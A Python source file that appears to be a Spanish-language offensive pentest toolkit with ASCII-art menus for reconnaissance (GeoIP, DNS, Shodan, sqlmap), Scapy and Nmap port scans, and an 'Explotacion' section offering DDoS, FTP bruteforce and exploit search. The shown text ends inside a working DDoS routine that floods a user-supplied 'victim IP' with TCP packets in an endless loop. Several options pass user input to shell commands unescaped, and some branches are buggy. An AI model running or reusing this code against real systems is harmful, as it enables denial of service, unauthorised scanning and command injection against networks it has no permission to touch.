#!/usr/bin/env python
# -*- coding: utf-8 -*-

import shodan, sys, pygeoip, pprintpp,os, dns, pywhois, scrapy,nmap, requests,subprocess, dns.resolver
import os,time,logging, json, nmap3 , ftplib, smtplib
from pynput.keyboard import Key, Listener
from scapy.all import *
from scapy.layers.inet import TCP
from scapy.sendrecv import sr1
from past.builtins import raw_input
from termcolor import colored
from socket import *



logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def menu_pentest():

	print(colored("\nLicense GPL", 'green', attrs=['bold']))
	print(colored("--------------------------------------------------------------------------------",'green',attrs=['bold']))
	print(colored(" ______   ___   ______    ___  ____    ___  ____   ______    ___  _____ ______  ",'green',attrs=['bold']))
	print(colored("|      |Y     Y|      | /  [_ |  o  )/  [_ |  _  Y|      | /  [_(   \_ |      | ",'green',attrs=['bold']))
	print(colored("l_j  l_j|  O  |l_j  l_jY    _]|   _/Y    _]|  |  |l_j  l_jY    _]\__  Tl_j  l_j ",'green',attrs=['bold']))
	print(colored("  |  |  |     |  |  |  |   [_ |  |  |   [_ |  |  |  |  |  |   [_ /  \ |  |  |   ",'green',attrs=['bold']))
	print(colored("  |  |  l     !  |  |  |     T|  |  |     T|  |  |  |  |  |     T\    |  |  |   ",'green',attrs=['bold']))
	print(colored("  l__j   \___/   l__j  l_____jl__j  l_____jl__j__j  l__j  l_____j \___j  l__j   ",'green',attrs=['bold']))
	print(colored("                                                                                 ",'green',attrs=['bold']))
	print(colored("----------------------------- Author: TOTEKINGPADI ------------------------------", 'green', attrs=['bold']))
	print(colored("\n1) Recoleccion informacion\n2) Analisis Vulnerabilidades\n3) Explotación\n4) Salir",'blue',attrs=['bold']))

def recoleccion_informacion():

	print(colored("\nLicense GPL", 'green', attrs=['bold']))
	print(colored("--------------------------------------------------------------------------------",'green',attrs=['bold']))
	print(colored(" ______   ___   ______    ___  ____    ___  ____   ______    ___  _____ ______  ",'green',attrs=['bold']))
	print(colored("|      |Y     Y|      | /  [_ |  o  )/  [_ |  _  Y|      | /  [_(   \_ |      | ",'green',attrs=['bold']))
	print(colored("l_j  l_j|  O  |l_j  l_jY    _]|   _/Y    _]|  |  |l_j  l_jY    _]\__  Tl_j  l_j ",'green',attrs=['bold']))
	print(colored("  |  |  |     |  |  |  |   [_ |  |  |   [_ |  |  |  |  |  |   [_ /  \ |  |  |   ",'green',attrs=['bold']))
	print(colored("  |  |  l     !  |  |  |     T|  |  |     T|  |  |  |  |  |     T\    |  |  |   ",'green',attrs=['bold']))
	print(colored("  l__j   \___/   l__j  l_____jl__j  l_____jl__j__j  l__j  l_____j \___j  l__j   ",'green',attrs=['bold']))
	print(colored("                                                                                 ",'green',attrs=['bold']))
	print(colored("------------------------ RECOLECCION INFORMACION --------------------------------", 'green', attrs=['bold']))
	print(colored("\n1) Geolocalizacion\n2) DNS\n3) Escaneo\n4) Shodan Hacking\n5) Shodan facets\n6) Requests\n7) Sqlmap\n8) Salir",'blue', attrs=['bold']))

def analisis_vulnerabilidades():

	print(colored("\nLicense GPL", 'green', attrs=['bold']))
	print(colored("--------------------------------------------------------------------------------",'green',attrs=['bold']))
	print(colored(" ______   ___   ______    ___  ____    ___  ____   ______    ___  _____ ______  ",'green',attrs=['bold']))
	print(colored("|      |Y     Y|      | /  [_ |  o  )/  [_ |  _  Y|      | /  [_(   \_ |      | ",'green',attrs=['bold']))
	print(colored("l_j  l_j|  O  |l_j  l_jY    _]|   _/Y    _]|  |  |l_j  l_jY    _]\__  Tl_j  l_j ",'green',attrs=['bold']))
	print(colored("  |  |  |     |  |  |  |   [_ |  |  |   [_ |  |  |  |  |  |   [_ /  \ |  |  |   ",'green',attrs=['bold']))
	print(colored("  |  |  l     !  |  |  |     T|  |  |     T|  |  |  |  |  |     T\    |  |  |   ",'green',attrs=['bold']))
	print(colored("  l__j   \___/   l__j  l_____jl__j  l_____jl__j__j  l__j  l_____j \___j  l__j   ",'green',attrs=['bold']))
	print(colored("                                                                                 ",'green',attrs=['bold']))
	print(colored("------------------------ ANALISIS VULNERABILIDADES-------------------------------", 'green', attrs=['bold']))
	print(colored("\n1) Scapy\n2) Nmap\n3) Osmedeus\n4) Salir",'blue', attrs=['bold']))


def explotacion():

	print(colored("\nLicense GPL", 'green', attrs=['bold']))
	print(colored("--------------------------------------------------------------------------------",'green',attrs=['bold']))
	print(colored(" ______   ___   ______    ___  ____    ___  ____   ______    ___  _____ ______  ",'green',attrs=['bold']))
	print(colored("|      |Y     Y|      | /  [_ |  o  )/  [_ |  _  Y|      | /  [_(   \_ |      | ",'green',attrs=['bold']))
	print(colored("l_j  l_j|  O  |l_j  l_jY    _]|   _/Y    _]|  |  |l_j  l_jY    _]\__  Tl_j  l_j ",'green',attrs=['bold']))
	print(colored("  |  |  |     |  |  |  |   [_ |  |  |   [_ |  |  |  |  |  |   [_ /  \ |  |  |   ",'green',attrs=['bold']))
	print(colored("  |  |  l     !  |  |  |     T|  |  |     T|  |  |  |  |  |     T\    |  |  |   ",'green',attrs=['bold']))
	print(colored("  l__j   \___/   l__j  l_____jl__j  l_____jl__j__j  l__j  l_____j \___j  l__j   ",'green',attrs=['bold']))
	print(colored("                                                                                 ",'green',attrs=['bold']))
	print(colored("------------------------ EXPLOTACION -------------------------------", 'green', attrs=['bold']))
	print(colored("\n1) DDOS\n2) BruteforceFTP\n3) SearchSploit\n4) Salir",'blue', attrs=['bold']))


def geolocalizacion():
	print(colored("\n***************** GEOLOCALIZACION ************************",'red',attrs=['bold']))
	print("\n1) Busqueda por dominio\n2) Busqueda por IP\n3) Salir")

def searchsploit():
	print(colored("\nLicense GPL", 'green', attrs=['bold']))
	print(colored("-------------------------------------------------------------", 'green', attrs=['bold']))
	print(colored("                           _               _       _ _       ", 'green', attrs=['bold']))
	print(colored("                          | |             | |     (_) |      ", 'green', attrs=['bold']))
	print(colored("   ___  ___  __ _ _ __ ___| |__  ___ _ __ | | ___  _| |_     ", 'green', attrs=['bold']))
	print(colored("  / __|/ _ \/ _` | '__/ __| '_ \/ __| '_ \| |/ _ \| | __|    ", 'green', attrs=['bold']))
	print(colored("  \__ \  __/ (_| | | | (__| | | \__ \ |_) | | (_) | | |_     ", 'green', attrs=['bold']))
	print(colored("  |___/\___|\__,_|_|  \___|_| |_|___/ .__/|_|\___/|_|\__|    ", 'green', attrs=['bold']))
	print(colored("                                    | |                      ", 'green', attrs=['bold']))
	print(colored("                                    |_|                      ", 'green', attrs=['bold']))
	print(colored("-------------------------------------------------------------", 'green', attrs=['bold']))
	print(colored("-------------------- Busquedas de exploits ------------------", 'green', attrs=['bold']))
	print(colored("\n1) Por Titulo\n2) Ruta completa\n3) Exploit-db\n4) Salir",'blue', attrs=['bold']))

while True:
	menu_pentest()
	try:
		opcion=int(input("\nIntroduce un opcion: "))
	except ValueError:
		print ("No has seleccionado una opcion correcta")
		menu_pentest()

	if opcion == 1:

		time.sleep(2)
		os.system('clear')
		recoleccion_informacion()
		try:
			opcionfase1=int(input("\nIntroduce un opcion: "))
		except ValueError:
			print ("No has seleccionado una opcion correcta")
			recoleccion_informacion()

		if opcionfase1 == 1:
			"""Utilizamos la base de datos GeoLite"""
			gi = pygeoip.GeoIP('GeoLiteCity.dat')
			geolocalizacion()

			try:
				opciongeo = int(input("Introduce un opcion: "))
			except ValueError:
				print("No has seleccionado una opcion correcta")

				if opciongeo == 1:
					dominio = input("Introduce un dominio del tipo (ejemplo: gmail.com): ")
					print(colored("\n Código del pais del servidor por dominio: ", 'red', attrs=['bold', 'blink']) + gi.country_code_by_name(dominio))
				elif opciongeo == 2:

					try:
						IP = input("Introduce una IP publica: ")
						print(colored("\n Código del país del servidor por IP: ", 'red', attrs=['bold', 'blink']) + gi.country_code_by_addr(IP))
						print(colored("\n Time zone del servidor por IP: ", 'red', attrs=['bold', 'blink']) + gi.time_zone_by_addr(IP))
						print(colored("\n Información completa del servidor por IP: ", 'red', attrs=['bold', 'blink']))
						pprintpp.pprint(gi.record_by_addr(IP))
					except ValueError:

						print("No has introducido una IP correcta")
						geolocalizacion()
				elif opciongeo == 3:
					time.sleep(2)
					os.system('clear')
					menu_pentest()
		elif opcionfase1 == 2:

			print(colored("\n***************** DNS ************************",'red',attrs=['bold']))
			dominio = input("Introduce un dominio del tipo (ejemplo: gmail.com): ")
			"""Consulta sobre registro IPV4"""
			ansA = dns.resolver.query(dominio, 'A')

			"""Consulta sobre registro IPV6"""
			ansAAAA = dns.resolver.query(dominio, 'AAAA')

			"""Consulta sobre registro MailServers"""
			ansMX = dns.resolver.query(dominio, 'MX')

			"""Consulta sobre registro NameServers"""
			ansNS = dns.resolver.query(dominio, 'NS')

			print(colored("\nRespuesta de DNS en IPV4: ", 'red', attrs=['bold', 'blink']))
			print(ansA.response.to_text())

			print(colored("\nRespuesta de DNS en IPV6: ", 'red', attrs=['bold', 'blink']))
			print(ansAAAA.response.to_text())

			print(colored("\nRespuesta de DNS en MailServers: ", 'red', attrs=['bold', 'blink']))
			print(ansMX.response.to_text())

			print(colored("\nRespuesta de DNS en NameServers: ", 'red', attrs=['bold', 'blink']))
			print(ansNS.response.to_text())

		elif opcionfase1 == 3:
			print(colored("\n***************** ESCANEO ************************",'red',attrs=['bold']))
			ip=raw_input("Introduce IP: ")
			start=int(input("Introduce un puerto de inicio: "))
			end=int(input("Introduce un puerto de fin: "))
			print("Escaneando IP {} :".format(ip))
			for port in range (start,end):
				print("Probando puerto {} ... ".format(port))
				s=socket(AF_INET,SOCK_STREAM)
				s.settimeout(5)
				if(s.connect_ex((ip,port))==0):
					print ("Puerto ",port, "esta abierto")
				s.close()
			print("Escaneo finalizado")
		elif opcionfase1 == 4:

			print(colored("\n***************** SHODAN HACKING ************************",'red',attrs=['bold']))
			# Clave de desarrollador de la API de shodan
			ShodanKeyString = open('shodanKey').readline().rstrip('\n')

			# Realizamos la conexion con la base de datos de Shodan
			ShodanApi = shodan.Shodan(ShodanKeyString)

			# Ponemos el código entre un try/catch para manejar las excepciones
			try:
				# Buscamos en Shodan con el método WebAPI.search()
				parametro=input("Indique el parametro para realizar la busqueda en Shodan (ejemplo: smb): ")
				resultados = ShodanApi.search(parametro)

				# Mostramos el resultado
				print('Cantidad de resultados encontrados: %s' % resultados['total'])
				for i in resultados['matches']:
					print(colored("IP: ", 'red', attrs=['bold']) + '%s' % i['ip_str'])
					print(colored("Data: ", 'red', attrs=['bold']) + '%s' % i['data'])
					print(colored("Hostnames: ", 'red', attrs=['bold']) + '%s' % i['hostnames'])
					print(colored("Puerto: ", 'red', attrs=['bold']) + '%s' % i['port'])
					print('')

			except shodan.APIError as e:
				print('Ups! Ha ocurrido un error: %s' % e)
		elif opcionfase1 == 5:
			print(colored("\n***************** SHODAN FACETS ************************",'red',attrs=['bold']))
			# Clave de desarrollador de la API de shodan
			ShodanKeyString = open('shodanKey').readline().rstrip('\n')

			# Lista de propiedades que queremos mostrar.
			# Por defecto se muestran los primeros 5 resultados.
			FACETS = [
				'org',
				'domain',
				'port',
				'asn',
				# Solo queremos mostrar el top 3 de paises.
				# Por defecto se muestran 5!!!
				# Si queremos mostrar mas de 5 indicamos ('country', 1000) para mostrar 1000, por ejemplo.
				('country', 3),
			]

			FACET_TITLES = {
				'org': 'Top 5 Organizaciones',
				'domain': 'Top 5 Dominios',
				'port': 'Top 5 Puertos',
				'asn': 'Top 5 Sistemas Autonomos',
				'country': 'Top 3 Paises',
			}

			# Setup API
			api = shodan.Shodan(ShodanKeyString)
			parametro = input("Indique el parametro para realizar la busqueda en Shodan (ejemplo: apache): ")
			# Generamos la variable de la query con los argumentos.
			query = ' '.join(parametro)

			# Usamos el metoddo count() porque no devuelve resultados y no requiere un plan de pago.
			# Y es mas rapido que ejecutar un search().
			result = api.count(query, facets=FACETS)

			print('Shodan Summary Information')
			print('Query: %s' % query)
			print('Resultados totales: %s\n' % result['total'])

			# Imprime la informacion de los facets.
			for facet in result['facets']:
				print(colored(FACET_TITLES[facet], 'red', attrs=['bold']))

				for term in result['facets'][facet]:
					print(colored('\n%s: %s\n' % (term['value'], term['count']), 'blue', attrs=['bold']))

		elif opcionfase1 == 6:
			print(colored("\n***************** REQUESTS ************************",'red',attrs=['bold']))
			url=input("Introduce una url (ejemplo: http://www.google.com): ")
			response=requests.get(url)
			status=response.status_code
			print("El codigo de estado es: ", status)
			cabeceras=response.headers
			print("Las cabeceras son: ", cabeceras)
			response_url=response.url
			print("Respuesta url: ", response_url)
		elif opcionfase1 == 7:
			print(colored("\n***************** SQLMAP ************************", 'red', attrs=['bold']))
			url=input("Introduce url (ejemplo: https://danceberry.ru/porno.php?id=394): ")
			subprocess.call("sqlmap -u '%s' --dbs" %url, shell=True)

		elif opcionfase1== 8:

			recoleccion_informacion()

	elif opcion == 2:

		time.sleep(2)
		os.system('clear')
		analisis_vulnerabilidades()
		try:
			opcionfase2=int(input("\nIntroduce un opcion: "))
		except ValueError:
			print ("No has seleccionado una opcion correcta")
			analisis_vulnerabilidades()

		if opcionfase2 == 1:

			time.sleep(2)
			os.system('clear')

			print(colored("License GPL", 'green', attrs=['bold']))
			print(colored("-----------------------------------------------------------------------------------------",'green',attrs=['bold']))
			print(colored("                                                            ______                       ",'green',attrs=['bold']))
			print(colored("             _____          _____       _____         _____|\     \  ______   _____      ",'green',attrs=['bold']))
			print(colored("        _____\    \    _____\    \_   /      |_      /     / |     ||\     \ |     |     ",'green',attrs=['bold']))
			print(colored("       /    / \    |  /     /|     | /         \    |      |/     /|\ \     \|     |     ",'green',attrs=['bold']))
			print(colored("      |    |  /___/| /     / /____/||     /\    \   |      |\____/ | \ \           |     ",'green',attrs=['bold']))
			print(colored("   ____\    \ |   |||     | |____|/ |    |  |    \  |\     \    | /   \ \____      |     ",'green',attrs=['bold']))
			print(colored("  /    /\    \|___|/|     |  _____  |     \/      \ | \     \___|/     \|___/     /|     ",'green',attrs=['bold']))
			print(colored(" |    |/ \    \     |\     \|\    \ |\      /\     \|  \     \             /     / |     ",'green',attrs=['bold']))
			print(colored(" |\____\ /____/|    | \_____\|    | | \_____\ \_____\\  \_____\           /_____/  /     ",'green',attrs=['bold']))
			print(colored(" | |   ||    | |    | |     /____/| | |     | |     | \ |     |           |     | /      ",'green',attrs=['bold']))
			print(colored("  \|___||____|/      \|_____|    ||  \|_____|\|_____|  \|_____|           |_____|/       ",'green',attrs=['bold']))
			print(colored("----------------------------- Author: TOTEKINGPADI ------------------------------", 'green', attrs=['bold']))
			print (colored("\n**************** WELCOME TO SCAPY **********************************",'green',attrs=['bold']))
			print(colored( "\n1) TCP\n2) ACK\n3) NULL\n4) XMAS\n5) UDP\n6) Salir",'blue',attrs=['bold']))

			try:
				opcion=int(input("Introduce un opcion: "))
			except ValueError:
				print ("No has seleccionado una opcion correcta")
				menu()
			if opcion == 1:
					ip = input("Introduce ip: ")
					try:
						npuertos = int(input("Introduce el numero de puertos que quieres analizar: "))
					except ValueError:
						print("Error, no has introducido un entero 1")

					if npuertos == 1:
						try:
							puerto = int(input("Introduce puerto a analizar: "))
							response = sr1(IP(dst=ip) / TCP(dport=puerto, flags="S"))

							if (str(type(response)) == "<class 'NoneType'>"):
								print("[-] Puerto " + str(puerto) + " cerrado")

							elif (response.haslayer(TCP)):
								if (response.getlayer(TCP).flags == 0x12):
									print("[+] Puerto " + str(puerto) + " abierto")

							elif (response.haslayer(ICMP)):
								if (response.getlayer(TCP).flags == 0x14):
									print("[-] Puerto " + str(puerto) + " cerrado")
						except ValueError:
								print("Error, no has introducido un entero 2")
					elif npuertos > 1:
						try:
							for i in range(npuertos):
								puerto = int(input("Introduce puerto a analizar: "))
								response = sr1(IP(dst=ip) / TCP(dport=puerto, flags="S"))
								if (str(type(response)) == "<class 'NoneType'>"):
									print("[-] Puerto " + str(puerto) + " cerrado")

								elif (response.haslayer(TCP)):
									if (response.getlayer(TCP).flags == 0x12):
										print("[+] Puerto " + str(puerto) + " abierto")

								elif (response.haslayer(ICMP)):
									if (response.getlayer(TCP).flags == 0x14):
										print("[-] Puerto " + str(puerto) + " cerrado")
						except ValueError:
							print("Error, no has introducido un entero 3")

			elif opcion == 2:
				ip = input("Introduce ip: ")
				try:
					npuertos = int(input("Introduce el numero de puertos que quieres analizar: "))
				except ValueError:
					print("Error, no has introducido un entero 1")

				if npuertos == 1:
					try:
						puerto = int(input("Introduce puerto a analizar: "))
						response = sr1(IP(dst=ip) / TCP(dport=puerto, flags="A"))
						print("Respuesta del tipo: " + str(type(response)))

						if (str(type(response)) == "<class 'NoneType'>"):
							print("[+] Encontrado firewall")

						elif (response.haslayer(TCP)):
							if (response.getlayer(TCP).flags == 0x4):
								print("[-] No encontrado firewall")

						elif (response.haslayer(ICMP)):
							if response.getlayer(ICMP).type == 3 and int(response.getlayer(ICMP).code) in [1, 2, 3, 9, 10, 13]:
								print("[+] Encontrado firewall")
					except ValueError as e:
						print(e)
				elif npuertos > 1:
					try:
						for i in range(npuertos):
							puerto = int(input("Introduce puerto a analizar: "))
							response = sr1(IP(dst=ip) / TCP(dport=puerto, flags="A"))
							print("Respuesta del tipo: " + str(type(response)))

						if (str(type(response)) == "<class 'NoneType'>"):
							print("[+] Encontrado firewall")

						elif (response.haslayer(TCP)):
							if (response.getlayer(TCP).flags == 0x4):
								print("[-] No encontrado firewall")

						elif (response.haslayer(ICMP)):
							if response.getlayer(ICMP).type == 3 and int(response.getlayer(ICMP).code) in [1, 2, 3, 9, 10, 13]:
								print("[+] Encontrado firewall")
					except ValueError as e:
						print(e)
			elif opcion == 3:
				ip = input("Introduce ip: ")
				try:
					npuertos = int(input("Introduce el numero de puertos que quieres analizar: "))
				except ValueError:
					print("Error, no has introducido un entero 1")

				if npuertos == 1:
					try:
						puerto = int(input("Introduce puerto a analizar: "))
						response = sr1(IP(dst=ip) / TCP(dport=puerto, flags=""))
						print("Respuesta del tipo: " + str(type(response)))

						if (str(type(response)) == "<class 'NoneType'>"):
							print("[+] Puerto "+ str(puerto) + "Abierto")

						elif (response.haslayer(TCP)):
							if (response.getlayer(TCP).flags == 0x14):
								print("[-] Puerto " +str(puerto) + " Cerrado ")

						elif (response.haslayer(ICMP)):
							if (response.getlayer(ICMP).type == 3 and int(response.getlayer(ICMP).code) in [1, 2, 3, 9, 10,
																												13]):
								print("[x] Puerto " +str(puerto) + "Filtrado")
					except ValueError as e:
						print(e)
				elif npuertos > 1:
					try:
						for i in range(npuertos):
							puerto = int(input("Introduce puerto a analizar: "))
							response = sr1(IP(dst=ip) / TCP(dport=puerto, flags=""))
							print("Respuesta del tipo: " + str(type(response)))

							if (str(type(response)) == "<class 'NoneType'>"):
								print("[+] Puerto " + str(puerto) + "Abierto")

							elif (response.haslayer(TCP)):
								if (response.getlayer(TCP).flags == 0x14):
									print("[-] Puerto " +str(puerto) + " Cerrado ")

							elif (response.haslayer(ICMP)):
								if (response.getlayer(ICMP).type == 3 and int(response.getlayer(ICMP).code) in [1, 2, 3, 9, 10,
																											13]):
									print("[x] Puerto " + str(puerto) + "Filtrado")
					except ValueError as e:
						print(e)
			elif opcion == 4:
				ip = input("Introduce ip: ")
				try:
					npuertos = int(input("Introduce el numero de puertos que quieres analizar: "))
				except ValueError:
					print("Error, no has introducido un entero 1")

				if npuertos == 1:
					try:
						puerto = int(input("Introduce puerto a analizar: "))
						response = sr1(IP(dst=ip) / TCP(dport=puerto, flags="FPU"))
						if response is None:
							print("[+] Puerto " + str(puerto) + "Abierto o Filtrado")
						elif (response.haslayer(TCP) and response.getlayer(TCP).flags == 0x14):
							print("[-] Puerto " +str(puerto) + " Cerrado ")
						elif (response.haslayer(ICMP) and response.getlayer(ICMP).type == 3):
							print("[x] Puerto " + str(puerto) + "Filtrado")
						else:
							print("Puerto inválido")
					except ValueError as e:
						print(e)
				elif npuertos > 1:
					try:
						for i in range(npuertos):
							puerto = int(input("Introduce puerto a analizar: "))
							if (i.isdigit()):
								response = sr1(IP(dst=ip) / TCP(dport=puerto, flags="FPU"))
								if response is None:
									print("[+] Puerto " + str(puerto) + "Abierto o Filtrado")
								elif (response.haslayer(TCP) and response.getlayer(TCP).flags == 0x14):
									print("[-] Puerto " +str(puerto) + " Cerrado ")
								elif (response.haslayer(ICMP) and response.getlayer(ICMP).type == 3):
									print("[x] Puerto " + str(puerto) + "Filtrado")
								else:
									print("Puerto inválido")
					except ValueError as e:
						print(e)
			elif opcion == 5:
				ip = input("Introduce ip: ")
				try:
					npuertos = int(input("Introduce el numero de puertos que quieres analizar: "))
				except ValueError:
					print("Error, no has introducido un entero 1")

				if npuertos == 1:
					try:
						puerto = int(input("Introduce puerto a analizar: "))
						response = sr1(IP(dst=ip) / UDP(dport=puerto))
						print("Respuesta del tipo: " + str(type(response)))
						if (str(type(response)) == "<class 'NoneType'>"):
							print("Tipo de clase Nonetype")
						elif (response.haslayer(UDP)):
							print("[+] Puerto " + str(puerto) + "Abierto")
						elif (response.haslayer(ICMP)):
							if (int(response.getlayer(ICMP).type) == 3 and int(response.getlayer(ICMP).code == 3)):
								print("[+] Puerto " + str(puerto) + "Cerrado")

							elif (int(response.getlayer(ICMP).type) == 3 and int(response.getlayer(ICMP).code) in [1, 2, 9,
																													   10, 13]):
								print("[+] Puerto " + str(puerto) + "Filtrado")
					except ValueError as e:
						print(e)
				elif npuertos > 1:
					try:
						for i in range(npuertos):
							puerto = int(input("Introduce puerto a analizar: "))
							response = sr1(IP(dst=ip) / UDP(dport=puerto))
							print("Respuesta del tipo: " + str(type(response)))
							if (str(type(response)) == "<class 'NoneType'>"):
								print("Tipo de clase Nonetype")
							elif (response.haslayer(UDP)):
								print("[+] Puerto " + str(puerto) + "Abierto")
							elif (response.haslayer(ICMP)):
								if (int(response.getlayer(ICMP).type) == 3 and int(response.getlayer(ICMP).code == 3)):
									print("[+] Puerto " + str(puerto) + "Cerrado")

								elif (int(response.getlayer(ICMP).type) == 3 and int(response.getlayer(ICMP).code) in [1, 2,
																														   9,
																														   10,
																														   13]):
									print("[+] Puerto " + str(puerto) + "Filtrado")
					except ValueError as e:
						print(e)

			elif opcion == 6:
				print("\nSaliendo...")
				break


		elif opcionfase2 == 2:

			time.sleep(2)
			os.system('clear')

			print(colored("License GPL ", 'green', attrs=['bold']))
			print(colored("--------------------------------------",'green',attrs=['bold']))
			print(colored("███╗   ██╗███╗   ███╗ █████╗ ██████╗  ", 'green', attrs=['bold']))
			print(colored("████╗  ██║████╗ ████║██╔══██╗██╔══██  ", 'green', attrs=['bold']))
			print(colored("██╔██╗ ██║██╔████╔██║███████║██████╔╝  ", 'green', attrs=['bold']))
			print(colored("██║╚██╗██║██║╚██╔╝██║██╔══██║██╔═══╝  ", 'green', attrs=['bold']))
			print(colored("██║ ╚████║██║ ╚═╝ ██║██║  ██║██║      ", 'green', attrs=['bold']))
			print(colored("╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝      ", 'green', attrs=['bold']))
			print(colored("------- Author: TOTEKINGPADI ---------", 'green', attrs=['bold']))
			print(colored("\nEscaneos NMAP", 'green', attrs=['bold']))
			print(colored("\n1) FIN\n2) IDLE\n3) PING\n4) SYN\n5) TCP\n6) Completo\n7) Salir", 'blue', attrs=['bold']))

			try:
				opcion = int(input("\nIntroduce un opcion: "))
			except ValueError:
				print("No has seleccionado una opcion correcta")
				menu()
			if opcion == 1:

				ip = input("Introduce ip: ")
				nmap = nmap3.NmapScanTechniques()
				result = nmap.nmap_fin_scan(ip)
				json_data = json.dumps(result)
				with open('scan_fin.json','w') as f:
					f.write(json_data)
					f.close()
				json_final= json.load(open('scan_fin.json'))
				print (colored("\n********************************************************* ",'blue',attrs=['bold']))
				print (colored("\t------------- NMAP FIN -----------------------------",'green',attrs=['bold']))
				print (colored("********************************************************** \n",'blue',attrs=['bold']))
				pprint(json_final)

			elif opcion == 2:
				ip = input("Introduce ip: ")
				nmap = nmap3.NmapScanTechniques()
				result = nmap.nmap_idle_scan(ip)
				json_data = json.dumps(result)
				with open('scan_idle.json','w') as f:
					f.write(json_data)
					f.close()
				json_final= json.load(open('scan_idle.json'))
				print (colored("\n********************************************************* ",'blue',attrs=['bold']))
				print (colored("\t------------- NMAP IDLE -----------------------------",'green',attrs=['bold']))
				print (colored("********************************************************** \n",'blue',attrs=['bold']))
				pprint(json_final)
			elif opcion == 3:
				ip = input("Introduce ip: ")
				nmap = nmap3.NmapScanTechniques()
				result = nmap.nmap_ping_scan(ip)
				json_data = json.dumps(result)
				with open('scan_ping.json','w') as f:
					f.write(json_data)
					f.close()
				json_final= json.load(open('scan_ping.json'))
				print (colored("\n********************************************************* ",'blue',attrs=['bold']))
				print (colored("\t------------- NMAP PING -----------------------------",'green',attrs=['bold']))
				print (colored("********************************************************** \n",'blue',attrs=['bold']))
				pprint(json_final)
			elif opcion == 4:
				ip = input("Introduce ip: ")
				nmap = nmap3.NmapScanTechniques()
				result = nmap.nmap_syn_scan(ip)
				json_data = json.dumps(result)
				with open('scan_syn.json','w') as f:
					f.write(json_data)
					f.close()
				json_final= json.load(open('scan_syn.json'))
				print (colored("\n********************************************************* ",'blue',attrs=['bold']))
				print (colored("\t------------- NMAP SYN -----------------------------",'green',attrs=['bold']))
				print (colored("********************************************************** \n",'blue',attrs=['bold']))
				pprint(json_final)
			elif opcion == 5:
				ip = input("Introduce ip: ")
				nmap = nmap3.NmapScanTechniques()
				result = nmap.nmap_tcp_scan(ip)
				json_data = json.dumps(result)
				with open('scan_tcp.json','w') as f:
					f.write(json_data)
					f.close()
				json_final= json.load(open('scan_tcp.json'))
				print (colored("\n********************************************************* ",'blue',attrs=['bold']))
				print (colored("\t------------- NMAP TCP -----------------------------",'green',attrs=['bold']))
				print (colored("********************************************************** \n",'blue',attrs=['bold']))
				pprint(json_final)
			elif opcion == 6:
				ip = input("Introduce ip: ")
				nmap = nmap3.Nmap()
				result = nmap.nmap_version_detection(ip)
				json_data = json.dumps(result)
				with open('scan_completo.json','w') as f:
					f.write(json_data)
					f.close()
				json_final= json.load(open('scan_completo.json'))
				print (colored("\n********************************************************* ",'blue',attrs=['bold']))
				print (colored("\t------------- NMAP COMPLETO -----------------------------",'green',attrs=['bold']))
				print (colored("********************************************************** \n",'blue',attrs=['bold']))
				pprint(json_final)
			elif opcion == 7:
				print("\nSaliendo...")
				break


		elif opcionfase2 == 3:

			time.sleep(2)
			os.system('clear')
			print (colored("----------------------------------------------------------------",'green',attrs=['bold']))
			print (colored("________                            .___                   		",'green',attrs=['bold']))
			print (colored("\_____  \   ______ _____   ____   __| _/____  __ __  ______		",'green',attrs=['bold']))
			print (colored(" /   |   \ /  ___//     \_/ __ \ / __ |/ __ \|  |  \/  ___/		",'green',attrs=['bold']))
			print (colored("/    |    \\___ \|  Y Y  \  ___// /_/ \  ___/|  |  /\___ \ 		",'green',attrs=['bold']))
			print (colored("\_______  /____  >__|_|  /\___  >____ |\___  >____//____  >		",'green',attrs=['bold']))
			print (colored("        \/     \/      \/     \/     \/    \/           \/ 		",'green',attrs=['bold']))
			print(colored("-------- github: https://github.com/j3ssie/Osmedeus----------",'green',attrs=['bold']))
			print(colored("\nMarco de seguridad ofensivo completamente automatizado para reconocimiento y escaneo de vulnerabilidades\n",'green',attrs=['bold']))

			target=input("Introduce la url a analizar. (Ej: www.google.com): ")
			subprocess.call("python3 osmedeus.py -t '%s'" %target, shell=True)

	elif opcion == 3:

		time.sleep(2)
		os.system('clear')
		explotacion()
		try:
			opcionfase3=int(input("\nIntroduce un opcion: "))
		except ValueError:
			print ("No has seleccionado una opcion correcta")
			explotacion()

		if opcionfase3 == 1:

			time.sleep(2)
			os.system('clear')
			print (colored("License GPL                                                     ",'blue',attrs=['bold']))
			print(colored("-----------------------------------------------------------------", 'green', attrs=['bold']))
			print (colored("     _____        _____           _____             ______      ",'blue',attrs=['bold']))
			print (colored(" ___|\    \   ___|\    \     ____|\    \        ___|\     \     ",'blue',attrs=['bold']))
			print (colored("|    |\    \ |    |\    \   /     /\    \      |    |\     \    ",'blue',attrs=['bold']))
			print (colored("|    | |    ||    | |    | /     /  \    \     |    |/____/|    ",'blue',attrs=['bold']))
			print (colored("|    | |    ||    | |    ||     |    |    | ___|    \|   | |    ",'blue',attrs=['bold']))
			print (colored("|    | |    ||    | |    ||     |    |    ||    \    \___|/     ",'blue',attrs=['bold']))
			print (colored("|    | |    ||    | |    ||\     \  /    /||    |\     \        ",'blue',attrs=['bold']))
			print (colored("|____|/____/||____|/____/|| \_____\/____/ ||\ ___\|_____|       ",'blue',attrs=['bold']))
			print (colored("|    /    | ||    /    | | \ |    ||    | /| |    |     |       ",'blue',attrs=['bold']))
			print (colored("|____|____|/ |____|____|/   \|____||____|/  \|____|_____|       ",'blue',attrs=['bold']))
			print (colored("  \(    )/     \(    )/        \(    )/        \(    )/         ",'blue',attrs=['bold']))
			print (colored("   '    '       '    '          '    '          '    '          ",'blue',attrs=['bold']))
			print(colored("------------------ Author: TOTEKINGPADI -------------------------", 'green', attrs=['bold']))

			victima = input("Introduce IP victima: ")
			nombre_equipo = socket.gethostname()
			src = socket.gethostbyname(nombre_equipo)
			numero_paquete = 1
			npuertos = input("Atacar desde un puerto (P) o desde multiples puertos (M): ")


			if npuertos == 'P':
				try:
					puerto_dst = int(input("Introduce el puerto a atacar: "))
					puerto_src = int(input("Introduce el puerto origen: "))
				except ValueError as e:
					print(e)
				while True:
					IP_ataque = IP(src=src,dst=victima)
					TCP_ataque = TCP(sport=puerto_src, dport=puerto_dst)
					pkt = IP_ataque/TCP_ataque
					send(pkt,inter = .001)
					print (colored("Paquete "+ str(numero_paquete) + " enviado",'green',attrs=['bold']))
					numero_paquete = numero_paquete + 1

			elif npuertos == 'M':
					i = 1
					try:
						puerto_dst = int(input("Introduce el puerto a atacar: "))
					except ValueError as e:
						print(e)
					while True:
